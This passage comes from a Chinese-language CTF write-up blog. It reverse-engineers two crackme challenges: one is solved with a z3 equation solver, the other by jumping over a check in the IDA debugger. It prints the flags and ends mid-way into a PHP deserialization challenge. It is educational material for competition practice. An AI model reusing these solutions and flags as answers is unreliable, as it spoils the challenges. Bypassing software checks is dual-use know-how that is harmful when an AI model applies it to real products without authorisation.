class="line">flag&#123;br41n_f**k_i5_go0d&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><ul><li>打开IDA反编译程序，发现main函数解析不了，通过关键字符串定位函数：</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281416426.png" alt="image-20210928141601526"></p><ul><li>函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10h] [ebp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">36</span>]; <span class="comment">// [esp+28h] [ebp-1FCh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+88h] [ebp-19Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+154h] [ebp-D0h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+158h] [ebp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// [esp+164h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> *v11; <span class="comment">// [esp+170h] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// [esp+17Ch] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">24</span>]; <span class="comment">// [esp+188h] [ebp-9Ch] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [esp+1A0h] [ebp-84h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [esp+1B0h] [ebp-74h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [esp+1C0h] [ebp-64h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [esp+1D0h] [ebp-54h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [esp+1E0h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v19[<span class="number">16</span>]; <span class="comment">// [esp+1F0h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v20[<span class="number">20</span>]; <span class="comment">// [esp+200h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+220h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_434032);</span><br><span class="line">  sub_411FA5(<span class="number">0x10</span>u);</span><br><span class="line">  sub_4121D5(v20);</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v3 = sub_41257C(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, sub_412572);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, v19);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::ios_base::<span class="keyword">operator</span> <span class="keyword">bool</span>(*(_DWORD *)(*(_DWORD *)v7 + <span class="number">4</span>) + v7) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_4121B7(v19);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( sub_411F28(v20) != <span class="number">5</span> );</span><br><span class="line">  v18 = *(_QWORD *)sub_411F4B(<span class="number">1</span>);</span><br><span class="line">  v17 = *(_QWORD *)sub_411F4B(<span class="number">2</span>);</span><br><span class="line">  v16 = *(_QWORD *)sub_411F4B(<span class="number">3</span>);</span><br><span class="line">  v15 = *(_QWORD *)sub_411F4B(<span class="number">4</span>) - <span class="number">0x666C616755</span>i64;</span><br><span class="line">  v14 = sub_41218F(v15, HIDWORD(v15));</span><br><span class="line">  <span class="keyword">if</span> ( sub_411F28(v20) == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v18 - v14 == <span class="number">0x61536369217D</span>i64 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v17 - v14 == <span class="number">0x586531316F</span>i64 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v16 - v14 == <span class="number">0x5F3631626F4E</span>i64 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v14 + v16 + v17 + v18 == <span class="number">0xC121F9FCC23A</span>i64 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You are right!&quot;</span>);</span><br><span class="line">            sub_4121FD(v20);</span><br><span class="line">            sub_4122ED(<span class="number">0x10</span>u);</span><br><span class="line">            sub_4122D9(v13);</span><br><span class="line">            LOBYTE(v21) = <span class="number">1</span>;</span><br><span class="line">            v12 = v20;</span><br><span class="line">            v11 = (<span class="keyword">int</span> *)sub_412392(v20);</span><br><span class="line">            v10 = (<span class="keyword">int</span> *)sub_41226B(v20);</span><br><span class="line">            <span class="keyword">while</span> ( v11 != v10 )</span><br><span class="line">            &#123;</span><br><span class="line">              v8 = *v11;</span><br><span class="line">              v9 = v11[<span class="number">1</span>];</span><br><span class="line">              v5 = sub_412423(v6, v8, v9);</span><br><span class="line">              LOBYTE(v21) = <span class="number">2</span>;</span><br><span class="line">              sub_4123B0(v5);</span><br><span class="line">              LOBYTE(v21) = <span class="number">1</span>;</span><br><span class="line">              sub_4123AB(v6);</span><br><span class="line">              v11 += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Now decode the res!&quot;</span>);</span><br><span class="line">            sub_412581();</span><br><span class="line">            LOBYTE(v21) = <span class="number">0</span>;</span><br><span class="line">            sub_412333(v13);</span><br><span class="line">            v21 = <span class="number">-1</span>;</span><br><span class="line">            sub_411F5F(v20);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;arrsum wrong!&quot;</span>);</span><br><span class="line">            sub_412581();</span><br><span class="line">            v21 = <span class="number">-1</span>;</span><br><span class="line">            sub_411F5F(v20);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;arr3 wrong!&quot;</span>);</span><br><span class="line">          sub_412581();</span><br><span class="line">          v21 = <span class="number">-1</span>;</span><br><span class="line">          sub_411F5F(v20);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;arr2 wrong!&quot;</span>);</span><br><span class="line">        sub_412581();</span><br><span class="line">        v21 = <span class="number">-1</span>;</span><br><span class="line">        sub_411F5F(v20);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;arr1 wrong!&quot;</span>);</span><br><span class="line">      sub_412581();</span><br><span class="line">      v21 = <span class="number">-1</span>;</span><br><span class="line">      sub_411F5F(v20);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;arr wrong!&quot;</span>);</span><br><span class="line">    sub_412581();</span><br><span class="line">    v21 = <span class="number">-1</span>;</span><br><span class="line">    sub_411F5F(v20);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>明显是解方程组，使用z3：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">flag = [Int(<span class="string">&#x27;v%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>]]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">3</span>] - flag[<span class="number">0</span>] == <span class="number">0x61536369217D</span>)</span><br><span class="line">s.add(flag[<span class="number">2</span>] - flag[<span class="number">0</span>] == <span class="number">0x586531316F</span>)</span><br><span class="line">s.add(flag[<span class="number">1</span>] - flag[<span class="number">0</span>] == <span class="number">0x5F3631626F4E</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + flag[<span class="number">2</span>] + flag[<span class="number">3</span>] == <span class="number">0xC121F9FCC23A</span>)</span><br><span class="line">s.add(flag[<span class="number">4</span>] - flag[<span class="number">0</span>] == <span class="number">0x666C616755</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">  m = s.model()</span><br><span class="line">  res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>]:</span><br><span class="line">    res += libnum.n2s(<span class="built_in">int</span>(<span class="built_in">str</span>(m[flag[i]])))</span><br><span class="line">  <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vlagUhe11o_F1boNacci!&#125;</span><br></pre></td></tr></table></figure><ul><li>实际上还有一步对变量<code>v14</code>的操作，是<code>v14 = sub_41218F(v15, HIDWORD(v15));</code>。不过这里已经看出flag了，就不再调试了：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11o_F1boNacci!&#125;</span><br></pre></td></tr></table></figure><h3 id="pig-brain-king"><a href="#pig-brain-king" class="headerlink" title="pig_brain_king"></a>pig_brain_king</h3><ul><li><p>参考链接：<a href="https://www.cnblogs.com/holittech/articles/15335676.html">https://www.cnblogs.com/holittech/articles/15335676.html</a></p></li><li><p>这是一个游戏的题目，需要回答正确1000道题目才能拿到flag，由于程序比较长，我们分段来解析这个程序：</p><ul><li>首先是在字典中取值，并打印出来， 不能看出这就是题目的输出：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">strcpy(v283, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;?!_&quot;);</span><br><span class="line">  v282 = 3;</span><br><span class="line">  sub_961154(v266, v269);</span><br><span class="line">  v284 = 0;</span><br><span class="line">  v259 = v283[67];</span><br><span class="line">  v252 = v283[66];</span><br><span class="line">  v246 = v283[32];</span><br><span class="line">  v239 = v283[39];</span><br><span class="line">  v232 = v283[34];</span><br><span class="line">  v228 = v283[36];</span><br><span class="line">  v219 = v283[39];</span><br><span class="line">  v214 = v283[34];</span><br><span class="line">  v210 = v283[26];</span><br><span class="line">  v207 = v283[43];</span><br><span class="line">  v203 = v283[27];</span><br><span class="line">  v198 = v283[32];</span><br><span class="line">  v196 = v283[34];</span><br><span class="line">  v193 = v283[41];</span><br><span class="line">  v188 = v283[45];</span><br><span class="line">  v185 = v283[44];</span><br><span class="line">  v182 = v283[30];</span><br><span class="line">  v181 = v283[32];</span><br><span class="line">  v178 = v283[39];</span><br><span class="line">  v175 = v283[40];</span><br><span class="line">  v172 = v283[43];</span><br><span class="line">  v169 = v283[45];</span><br><span class="line">  v167 = v283[44];</span><br><span class="line">  v163 = v283[30];</span><br><span class="line">  v160 = v283[33];</span><br><span class="line">  v158 = v283[45];</span><br><span class="line">  v155 = v283[44];</span><br><span class="line">  v154 = v283[34];</span><br><span class="line">  v151 = v283[40];</span><br><span class="line">  v149 = v283[33];</span><br><span class="line">  v3 = sub_96121C(std::cout, v283[22]);</span><br></pre></td></tr></table></figure><ul><li>打印的值为（修改为小端序）：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;?!_&quot;</span></span><br><span class="line">array = [<span class="number">67</span>, <span class="number">66</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">34</span>, <span class="number">36</span>, <span class="number">39</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">43</span>, <span class="number">27</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">45</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">45</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">33</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">res += table[i]</span><br><span class="line"><span class="built_in">print</span>(res[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whoisthestrongestpigbrainking?!</span><br><span class="line">canyouanswer1000questionscorrectly?</span><br><span class="line">nowstartdoingthequestions!</span><br><span class="line">pleaseenter</span><br><span class="line">nonono</span><br><span class="line">bingo!</span><br><span class="line">theansweris</span><br></pre></td></tr></table></figure><ul><li>找到<code>theansweris</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v265 = v283[<span class="number">44</span>];</span><br><span class="line">    v258 = v283[<span class="number">34</span>];</span><br><span class="line">    v245 = v283[<span class="number">43</span>];</span><br><span class="line">    v238 = v283[<span class="number">30</span>];</span><br><span class="line">    v231 = v283[<span class="number">48</span>];</span><br><span class="line">    v227 = v283[<span class="number">44</span>];</span><br><span class="line">    v223 = v283[<span class="number">39</span>];</span><br><span class="line">    v218 = v283[<span class="number">26</span>];</span><br><span class="line">    v209 = v283[<span class="number">30</span>];</span><br><span class="line">    v206 = v283[<span class="number">33</span>];</span><br><span class="line">    v134 = sub_96121C(<span class="built_in">std</span>::<span class="built_in">cout</span>, v283[<span class="number">19</span>]);</span><br><span class="line">    v135 = sub_96121C(v134, v206);</span><br><span class="line">    v136 = sub_96121C(v135, v209);</span><br><span class="line">    v137 = sub_961474(v136, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v138 = sub_96121C(v137, v218);</span><br><span class="line">    v139 = sub_96121C(v138, v223);</span><br><span class="line">    v140 = sub_96121C(v139, v227);</span><br><span class="line">    v141 = sub_96121C(v140, v231);</span><br><span class="line">    v142 = sub_96121C(v141, v238);</span><br><span class="line">    v143 = sub_96121C(v142, v245);</span><br><span class="line">    v144 = sub_961474(v143, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v145 = sub_96121C(v144, v258);</span><br><span class="line">    v146 = sub_96121C(v145, v265);</span><br><span class="line">    sub_961474(v146, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">    sub_9614BF(v267, v270);</span><br><span class="line">  &#125;</span><br><span class="line">  Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">  system(<span class="string">&quot;cls&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><code>system(&quot;cls&quot;);</code>是系统清屏函数，定位到关键函数<code>sub_9614BF(v267, v270);</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__CheckForDebuggerJustMyCode(&amp;unk_97F035);</span><br><span class="line">GetConsoleScreenBufferInfo(*((HANDLE *)v90 + <span class="number">64</span>), &amp;ConsoleScreenBufferInfo);</span><br><span class="line">*((_WORD *)v90 + <span class="number">136</span>) = ConsoleScreenBufferInfo.dwCursorPosition.X;</span><br><span class="line">*((_WORD *)v90 + <span class="number">137</span>) = ConsoleScreenBufferInfo.dwCursorPosition.Y;</span><br><span class="line"><span class="keyword">if</span> ( *((<span class="keyword">double</span> *)v90 + <span class="number">33</span>) &gt; <span class="number">3330.0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sub_9610AA(&amp;unk_978DD6);</span><br><span class="line">  v91 = <span class="number">0</span>;</span><br><span class="line">  sub_961442(v88);</span><br><span class="line">  v91 = <span class="number">-1</span>;</span><br><span class="line">  sub_961528();</span><br><span class="line">  v85 = *((_BYTE *)v90 + <span class="number">249</span>);</span><br><span class="line">  v84 = *((_BYTE *)v90 + <span class="number">251</span>);</span><br><span class="line">  v83 = *((_BYTE *)v90 + <span class="number">223</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><ul><li><p>发现这里存在一个<code>if</code>判断，猜测这里就是判断打印flag的函数。</p></li><li><p>回到主函数我们发现在上方还存在一个<code>sub_9614BF(v267, v270);</code>函数，判断是否能够打印flag，且之前打印的字符串为<code>owstartdoingthequestions!</code>。意思就是在游戏开始时也会判断一次。</p></li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281539840.png" alt="image-20210928153904464"></p></li><li><p>使用IDA动调，在<code>sub_9614BF(v267, v270);</code>函数内部if语句之前下断点：</p></li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281542535.png" alt="image-20210928154154020"></p><ul><li>运行到断点处后，双击修改EIP的值为if语句后第一个push的指令地址<code>0x0086CB81</code>，按F9继续运行，就可以得到flag。</li></ul><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202109281543827.png" alt="image-20210928154339514"></p><p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318197.png" alt="image-20210928150520514"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0U_ar3_The_k1ng_0f_pig_bra1n!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;hellounser&quot;&gt;&lt;a href=&quot;#hellounser&quot; class=&quot;headerlink&quot; title=&quot;hellounser&quot;&gt;&lt;/a&gt;hellounser&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;一道php反序列化的题目：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;A&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$var&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;show&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span 